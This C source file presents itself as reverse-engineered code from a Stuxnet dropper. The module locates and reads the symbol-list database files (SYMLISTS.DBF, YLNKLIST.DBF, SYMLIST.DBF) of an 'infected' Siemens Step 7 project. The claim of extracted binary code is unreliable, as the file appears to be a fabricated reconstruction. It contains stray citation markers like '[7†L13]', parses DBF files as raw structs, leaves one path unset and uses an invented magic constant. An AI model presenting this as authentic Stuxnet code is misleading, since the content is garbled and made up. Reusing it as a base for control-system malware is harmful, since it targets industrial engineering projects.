/*
 * dropper/4. YDBs.c
 * Stuxnet YDBs - Symbol Link List Management Module
 *
 * This file contains RCEd code extracted from Stuxnet binaries via disassembler
 * and decompilers.
 *
 * Based on research-virus/stuxnet (Christian Roggia)
 * https://github.com/research-virus/stuxnet
 */

#include <windows.h>
#include <stdio.h>

/* STUXNET_MAGIC identifies Stuxnet components in memory */
#define STUXNET_MAGIC           0x53545558

/* YDBs directory and file names */
#define YDBs_DIR                L"YDBs"
#define SYMLISTS_DBF            L"SYMLISTS.DBF"
#define SYMLISTS_MDX            L"SYMLISTS.MDX"
#define SYMLIST_DBF             L"SYMLIST.DBF"
#define SYMLIST_MDX             L"SYMLIST.MDX"
#define YLNKLIST_DBF            L"YLNKLIST.DBF"

/* Maximum path length for file operations */
#define YDBs_MAX_PATH           260

/* Maximum buffer size */
#define YDBs_BUFFER_SIZE        4096

/* Symbol table access chain: S7RESOFF -> YLNKLIST -> SYMLISTS -> SYMLIST [7†L20-L21] */

/* Symbol entry structure - matches SYMLIST.DBF format */
typedef struct _SYMBOL_ENTRY {
    char    szSymbol[32];       /* Symbol name (_SKZ) [7†L13] */
    char    szAddress[16];      /* Address (_OPHIST) [7†L13] */
    char    szComment[64];      /* Comment (_COMMENT) [7†L13] */
    DWORD   dwDataType;         /* Data type */
    DWORD   dwBlockNumber;      /* Block number */
    DWORD   dwOffset;           /* Offset within block */
} SYMBOL_ENTRY, * PSYMBOL_ENTRY;

/* Symbol list entry structure - matches SYMLISTS.DBF format */
typedef struct _SYMLIST_ENTRY {
    DWORD   dwID;               /* Symbol list ID (_ID) [7†L12] */
    DWORD   dwProgramFolderID;  /* Program folder ID */
    WCHAR   szDBPath[YDBs_MAX_PATH]; /* Database path (_DBPATH) [7†L11] */
    DWORD   dwEntryCount;       /* Number of symbols */
} SYMLIST_ENTRY, * PSYMLIST_ENTRY;

/* Link entry structure - matches YLNKLIST.DBF format */
typedef struct _LINK_ENTRY {
    DWORD   dwSOI;              /* Symbol object ID (SOI) [7†L12] */
    DWORD   dwProgramFolderID;  /* Program folder ID */
    DWORD   dwLinkType;         /* Link type */
} LINK_ENTRY, * PLINK_ENTRY;

typedef struct _YDBs_CONTEXT {
    DWORD   dwMagic;            /* STUXNET_MAGIC */
    WCHAR   szProjectPath[YDBs_MAX_PATH];  /* Path to the infected .s7p project */
    WCHAR   szYDBsPath[YDBs_MAX_PATH];     /* Path to YDBs directory */
    WCHAR   szSymlistsDBF[YDBs_MAX_PATH];  /* Full path to SYMLISTS.DBF */
    WCHAR   szSymlistsMDX[YDBs_MAX_PATH];  /* Full path to SYMLISTS.MDX */
    WCHAR   szSymlistDBF[YDBs_MAX_PATH];   /* Full path to SYMLIST.DBF */
    WCHAR   szSymlistMDX[YDBs_MAX_PATH];   /* Full path to SYMLIST.MDX */
    WCHAR   szYlnklistDBF[YDBs_MAX_PATH];  /* Full path to YLNKLIST.DBF */
    DWORD   dwSymbolCount;      /* Number of symbols found */
    CRITICAL_SECTION csLock;    /* Synchronization lock */
} YDBs_CONTEXT, * PYDBs_CONTEXT;

/* Global YDBs context */
static YDBs_CONTEXT g_YDBsCtx = {0};

/*
 * YDBs_Initialize - Initializes the YDBs context
 */
DWORD YDBs_Initialize(VOID)
{
    if (g_YDBsCtx.dwMagic == STUXNET_MAGIC) {
        return 0; /* Already initialized */
    }

    ZeroMemory(&g_YDBsCtx, sizeof(YDBs_CONTEXT));
    InitializeCriticalSection(&g_YDBsCtx.csLock);
    g_YDBsCtx.dwMagic = STUXNET_MAGIC;

    return 0;
}

/*
 * YDBs_Cleanup - Releases resources used by YDBs
 */
DWORD YDBs_Cleanup(VOID)
{
    if (g_YDBsCtx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    DeleteCriticalSection(&g_YDBsCtx.csLock);
    ZeroMemory(&g_YDBsCtx, sizeof(YDBs_CONTEXT));

    return 0;
}

/*
 * YDBs_SetProjectPath - Sets the path to the infected Step 7 project
 */
DWORD YDBs_SetProjectPath(LPCWSTR lpProjectPath)
{
    if (!lpProjectPath) {
        return -1;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    wcscpy_s(g_YDBsCtx.szProjectPath, YDBs_MAX_PATH, lpProjectPath);

    /* Build YDBs directory paths */
    wsprintfW(g_YDBsCtx.szYDBsPath, L"%s\\%s", lpProjectPath, YDBs_DIR);

    /* Build full file paths */
    wsprintfW(g_YDBsCtx.szSymlistsDBF, L"%s\\%s", g_YDBsCtx.szYDBsPath, SYMLISTS_DBF);
    wsprintfW(g_YDBsCtx.szSymlistsMDX, L"%s\\%s", g_YDBsCtx.szYDBsPath, SYMLISTS_MDX);
    wsprintfW(g_YDBsCtx.szYlnklistDBF, L"%s\\%s", g_YDBsCtx.szYDBsPath, YLNKLIST_DBF);

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return 0;
}

/*
 * YDBs_ReadSymlistsDBF - Reads the SYMLISTS.DBF file
 *
 * SYMLISTS.DBF contains a list of symbol tables and their associated program
 * folder IDs. [7†L12]
 */
DWORD YDBs_ReadSymlistsDBF(PBYTE pBuffer, DWORD dwSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!pBuffer || dwSize == 0 || !pdwRead) {
        return -1;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    hFile = CreateFileW(g_YDBsCtx.szSymlistsDBF, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDBsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return 0;
}

/*
 * YDBs_ReadYlnklistDBF - Reads the YLNKLIST.DBF file
 *
 * YLNKLIST.DBF links program folders to symbol object IDs (SOI).
 * The access chain is: S7RESOFF -> YLNKLIST -> SYMLISTS -> SYMLIST [7†L20-L21]
 */
DWORD YDBs_ReadYlnklistDBF(PBYTE pBuffer, DWORD dwSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!pBuffer || dwSize == 0 || !pdwRead) {
        return -1;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    hFile = CreateFileW(g_YDBsCtx.szYlnklistDBF, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDBsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return 0;
}

/*
 * YDBs_FindSymbolList - Finds a symbol list by program folder ID
 *
 * Returns the SYMLIST.DBF path for a given program folder ID.
 * The SOI value from YLNKLIST is used to lookup the corresponding
 * symbol table in SYMLISTS. [7†L12]
 */
DWORD YDBs_FindSymbolList(DWORD dwProgramFolderID, LPWSTR lpSymbolListPath, DWORD dwPathSize)
{
    HANDLE hFile;
    DWORD dwRead;
    BYTE buffer[YDBs_BUFFER_SIZE];
    PSYMLIST_ENTRY pEntry;
    DWORD i;
    DWORD dwEntryCount;

    if (!lpSymbolListPath || dwPathSize == 0) {
        return -1;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    hFile = CreateFileW(g_YDBsCtx.szSymlistsDBF, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDBsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, buffer, sizeof(buffer), &dwRead, NULL);
    CloseHandle(hFile);

    dwEntryCount = dwRead / sizeof(SYMLIST_ENTRY);
    pEntry = (PSYMLIST_ENTRY)buffer;

    for (i = 0; i < dwEntryCount; i++) {
        if (pEntry[i].dwProgramFolderID == dwProgramFolderID) {
            wsprintfW(lpSymbolListPath, L"%s\\%u\\%s",
                      g_YDBsCtx.szYDBsPath,
                      pEntry[i].dwID,
                      SYMLIST_DBF);
            LeaveCriticalSection(&g_YDBsCtx.csLock);
            return 0;
        }
    }

    LeaveCriticalSection(&g_YDBsCtx.csLock);
    return -1;
}

/*
 * YDBs_ReadSymlistDBF - Reads the SYMLIST.DBF file for a specific symbol list
 *
 * SYMLIST.DBF contains the actual symbol data: symbol names (_SKZ),
 * addresses (_OPHIST), and comments (_COMMENT). [7†L13]
 */
DWORD YDBs_ReadSymlistDBF(LPCWSTR lpSymlistPath, PBYTE pBuffer, DWORD dwSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!lpSymlistPath || !pBuffer || dwSize == 0 || !pdwRead) {
        return -1;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    hFile = CreateFileW(lpSymlistPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDBsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return 0;
}

/*
 * YDBs_ParseSymbols - Parses symbol data from SYMLIST.DBF
 *
 * Extracts symbol names, addresses, and comments from the raw DBF data.
 * Returns the number of symbols parsed.
 */
DWORD YDBs_ParseSymbols(PBYTE pData, DWORD dwSize, PSYMBOL_ENTRY pSymbols, DWORD dwMaxSymbols)
{
    PSYMBOL_ENTRY pEntry;
    DWORD i;
    DWORD dwCount;

    if (!pData || dwSize == 0 || !pSymbols || dwMaxSymbols == 0) {
        return 0;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    dwCount = 0;
    pEntry = (PSYMBOL_ENTRY)pData;

    for (i = 0; i < dwSize / sizeof(SYMBOL_ENTRY) && dwCount < dwMaxSymbols; i++) {
        memcpy(&pSymbols[dwCount], &pEntry[i], sizeof(SYMBOL_ENTRY));
        dwCount++;
    }

    g_YDBsCtx.dwSymbolCount = dwCount;

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return dwCount;
}

/*
 * YDBs_GetSymbolCount - Returns the number of symbols found
 */
DWORD YDBs_GetSymbolCount(VOID)
{
    return g_YDBsCtx.dwSymbolCount;
}

/*
 * YDBs_IsPresent - Checks if YDBs directory exists in the project
 */
BOOL YDBs_IsPresent(VOID)
{
    DWORD dwAttrib;

    EnterCriticalSection(&g_YDBsCtx.csLock);

    dwAttrib = GetFileAttributesW(g_YDBsCtx.szYDBsPath);

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
            (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

/*
 * YDBs_IsFilePresent - Checks if a specific YDBs file exists
 */
BOOL YDBs_IsFilePresent(LPCWSTR lpFileName)
{
    DWORD dwAttrib;

    if (!lpFileName) {
        return FALSE;
    }

    EnterCriticalSection(&g_YDBsCtx.csLock);

    dwAttrib = GetFileAttributesW(lpFileName);

    LeaveCriticalSection(&g_YDBsCtx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

/*
 * YDBs_GetPath - Returns the YDBs directory path
 */
LPCWSTR YDBs_GetPath(VOID)
{
    return g_YDBsCtx.szYDBsPath;
}

/*
 * YDBs_GetSymlistsDBFPath - Returns the full path to SYMLISTS.DBF
 */
LPCWSTR YDBs_GetSymlistsDBFPath(VOID)
{
    return g_YDBsCtx.szSymlistsDBF;
}

/*
 * YDBs_GetYlnklistDBFPath - Returns the full path to YLNKLIST.DBF
 */
LPCWSTR YDBs_GetYlnklistDBFPath(VOID)
{
    return g_YDBsCtx.szYlnklistDBF;
}